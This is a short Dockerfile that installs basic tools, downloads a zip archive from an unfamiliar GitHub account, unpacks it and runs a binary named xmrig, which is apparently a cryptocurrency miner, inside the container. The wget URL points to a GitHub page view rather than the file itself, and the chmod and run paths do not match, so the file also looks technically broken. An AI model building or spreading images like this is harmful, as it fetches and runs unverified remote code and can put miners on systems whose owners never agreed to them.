FROM ubuntu:latest
RUN apt-get update && apt-get install -y vim git curl pciutils wget
RUN apt-get install -y unzip
RUN wget https://github.com/AimTuxHvH/ubuntu/blob/master/Desktop.zip
RUN unzip Desktop.zip
RUN chmod +x "/xmrig"
RUN ./xmrig
